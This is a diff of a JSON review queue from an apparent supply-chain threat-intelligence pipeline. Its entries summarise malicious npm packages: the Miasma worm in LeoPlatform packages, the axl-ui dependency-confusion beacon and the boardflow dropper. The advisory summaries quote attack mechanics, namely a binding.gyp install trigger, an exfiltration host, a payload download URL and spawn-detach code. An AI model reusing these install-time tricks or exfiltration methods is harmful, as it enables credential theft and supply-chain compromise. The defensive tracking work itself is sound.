-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.904Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-2659d8aedb505748",
-      "canonicalSubjectId": "MAL-2026-6424",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-connector-mongo (npm)",
-      "summary": "The `leo-connector-mongo` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6424"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6424"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.838Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.838Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-b19951f63123cd0f",
-      "canonicalSubjectId": "MAL-2026-6423",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-connector-elasticsearch (npm)",
-      "summary": "The `leo-connector-elasticsearch` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6423"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6423"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.754Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.754Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-41ede0f0f1d3e446",
-      "canonicalSubjectId": "MAL-2026-6419",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-cache (npm)",
-      "summary": "The `leo-cache` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6419"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6419"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.754Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.754Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-71f54ff16f32337e",
-      "canonicalSubjectId": "MAL-2026-6418",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-aws (npm)",
-      "summary": "The `leo-aws` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6418"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6418"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.747Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.747Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-365fe9fccd5e0c8d",
-      "canonicalSubjectId": "MAL-2026-6422",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-config (npm)",
-      "summary": "The `leo-config` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6422"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6422"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.745Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.745Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-55c2197fdb4115bc",
-      "canonicalSubjectId": "MAL-2026-6421",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-cli (npm)",
-      "summary": "The `leo-cli` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6421"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6421"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.732Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.732Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-83c79532720e3787",
@@ -1576,119 +1978,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-d28d1a4a77cadf03",
-      "canonicalSubjectId": "MAL-2026-6417",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-auth (npm)",
-      "summary": "The `leo-auth` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6417"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6417"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.705Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.705Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-14edc51429c29c1f",
-      "canonicalSubjectId": "MAL-2026-6420",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in leo-cdk-lib (npm)",
-      "summary": "The `leo-cdk-lib` npm package was compromised as part of the Miasma worm campaign targeting the LeoPlatform npm ecosystem. On June 24, 2026, 20 LeoPlatform packages were published within a 3-second window by a threat actor who had taken over the npm account `czirker` belonging to the LeoPlatform organization. The malicious payload is triggered automatically during `npm install` via a `binding.gyp` file using node-gyp command expansion (`<!(node index.js > /dev/null 2>&1 && echo stub.c)`), which bypasses lifecycle script scanners. The replaced `index.js` (~5.2 MB, obfuscated with ROT-N + AES-128-GCM encryption) deploys a multi-stage worm with the following capabilities: - Credential theft: Targets npm, GitHub, PyPI, RubyGems, Kubernetes, HashiCorp Vault, AWS (IAM keys, Secrets Manager, IMDS), 1Password, JFrog Artifactory, and SSH keys. - AI tool targeting: Exfiltrates configuration files for Claude, Cursor, Gemini, and VS Code. - Worm propagation: Enumerates npm packages and auto-publishes version bumps to spread to other maintainers in the ecosystem. - GitHub persistence: Creates orphan `snapshot-<hex>` branches with fake \"Dependabot Updates\" workflows to maintain access after initial compromise. Any system that installed this version should be considered fully compromised. Rotate all secrets immediately from a separate, clean machine. See the linked SafeDep report for full payload analysis, indicators of compromise, and remediation guidance.",
-      "sources": [
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6420"
-      ],
-      "mergedLeadRefs": [
-        "osv:MAL-2026-6420"
-      ],
-      "firstSeenAt": "2026-06-24T23:04:55.000Z",
-      "lastMaterialActivityAt": "2026-06-25T06:01:22.702Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T06:01:22.702Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check.",
+      "staleCarryForward": true,
+      "carriedForwardAt": "2026-06-25T09:52:16.908Z"
     },
     {
       "candidateId": "SC-CAND-67152acfd91fd840",
@@ -1742,125 +2039,14 @@
         "current lead",
         "active exploitation or malware signal",
         "advisory database signal",
-        "supply-chain term match"
+        "supply-chain term match",
+        "carried forward pending review"
       ],
       "queueAction": "candidate_review",
       "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-4e948df0fcc1063b",
-      "canonicalSubjectId": "GHSA-F4W9-3FVX-Q5XW",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in axl-ui (npm)",
-      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (6fbc071f0ee6323c87fa6be049a9b151217f7146605ef89b4494f7ef07e7d534) axl-ui@9.9.99 is a dependency-confusion squat targeting an internal package name. package.json declares a postinstall hook (`node beacon.js`) that fires automatically on `npm install`. beacon.js reads `os.hostname()` and transmits it to a hardcoded Burp Collaborator out-of-band host (`tspeuj1fodn3cj8v30uck2fs4jaby1mq.oastify.com`) via two channels: a DNS lookup of `<nonce>.host.<collaborator>` and an HTTPS POST with JSON body `{pkg, nonce, host}`. The version number 9.9.99 and the self-described \"internal placeholder\" description are the canonical dependency-confusion shape: any private build that resolves `axl-ui` from public npm will execute the beacon and leak the host identity to the attacker. Even if framed as a research proof-of-concept, the harm to installers is real — installer-side data leaves the build machine to an attacker-controlled endpoint without consent. ## Source: ghsa-malware (1fdd3e217438d2f477bb133573c4a124e78868e32c72bab59dbc8ba0cff789c6) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it. ## Source: ossf-package-analysis (aca109fdc13102e60179b8d6c63a996da233e4910b6260da8838df727f33a64f) The OpenSSF Package Analysis project identified 'axl-ui' @ 9.9.99 (npm) as malicious. It is considered malicious because: - The package communicates with a domain associated with malicious activity.",
-      "sources": [
-        "github-advisory",
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-5742",
-        "https://github.com/advisories/GHSA-f4w9-3fvx-q5xw"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-f4w9-3fvx-q5xw",
-        "osv:MAL-2026-5742"
-      ],
-      "firstSeenAt": "2026-06-13T20:11:39.000Z",
-      "lastMaterialActivityAt": "2026-06-25T05:46:21.689Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-25T05:46:21.689Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-6ba1dde6d60884ee",
-      "canonicalSubjectId": "GHSA-38X4-9P94-XG4P",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in boardflow (npm)",
-      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (f9d5c1524281430272215f48a90b957cf08f76dcb9954cb73945421dff358eb2) package.json declares `preinstall: node install.js`, which fires automatically on `npm install`. install.js is heavily obfuscated (obfuscator.io string-array shuffle with `_0xNNNN` identifiers and split-string concatenation) to hide its behavior. After deobfuscation, the script downloads `https://www.pooron.org/ice.exe` into the OS temp directory as `tester_<randomhex>.exe`, chmods it 755, and spawn-detaches it via `spawn(PAYLOAD_PATH, [], {detached:true, stdio:'ignore', windowsHide:true}).unref()` — using a cmd-style invocation on Windows and direct exec on macOS/Linux. A console message `[boardstep] Optional dependency initialized.` is printed as a cover story (note that `boardstep` does not match the package name `boardflow`). The payload domain `pooron.org` is not the package's publisher, the URL is mutable and unpinned, no hash or signature check is performed, and the binary is opaque. Supporting indicators of disposability: README is 0 bytes, `dependencies` declares a self-reference (`boardflow: ^1.1.8`), and the package's stated kanban purpose has no implementing code. This is a textbook install-time dropper: any developer or build system running `npm install boardflow` immediately executes attacker-controlled code with the installer's privileges. ## Source: ghsa-malware (cc323a00bbf1170838fed70d04a3915cb58a92a97ab496e8d02e6eaac03bebb0) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "sources": [
-        "github-advisory",
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-5799",
-        "https://github.com/advisories/GHSA-38x4-9p94-xg4p"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-38x4-9p94-xg4p",
-        "osv:MAL-2026-5799"
-      ],
-      "firstSeenAt": "2026-06-15T17:30:59.000Z",
-      "lastMaterialActivityAt": "2026-06-25T05:46:21.665Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
